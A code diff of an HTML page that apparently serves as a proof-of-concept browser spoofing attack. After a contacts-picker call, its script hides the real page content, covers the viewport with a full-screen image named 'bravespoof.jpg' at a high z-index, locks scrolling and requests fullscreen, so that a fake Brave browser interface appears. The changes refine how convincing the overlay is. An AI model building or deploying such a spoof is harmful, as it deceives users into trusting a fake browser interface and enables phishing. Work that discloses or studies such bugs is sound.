@@ -5,21 +5,19 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
         <style>
-            body, html {
+            body {
                 margin: 0;
                 padding: 0;
-                width: 100%;
-                height: 100%;
-                overflow: hidden;
-                background-color: #000;
             }         
             #spoof {
+                display: none;
                 position: fixed;
                 top: 0;
                 left: 0;
                 width: 100vw;
                 height: 100vh;
                 object-fit: fill;
+                z-index: 9999;
             }
         </style>
         <script>
@@ -27,14 +25,15 @@
                 (async () => {
                     try { await navigator.contacts.select(["name"], {}); } catch (e) {}
                 })();
-                document.getElementById("spoof").style   = "display: block;";
-                document.getElementById("content").style = "display: none;";
+                document.getElementById("spoof").style.display = "block";
+                document.getElementById("content").style.display = "none";
+                document.body.style.overflow = "hidden"; 
                 document.documentElement.requestFullscreen();
             }
         </script>
     </head>  
     <body>
-        <img id="spoof" style="display: none;" src="bravespoof.jpg">
+        <img id="spoof" src="bravespoof.jpg">
         <div id="content">
             <br><br><br>
             <center>
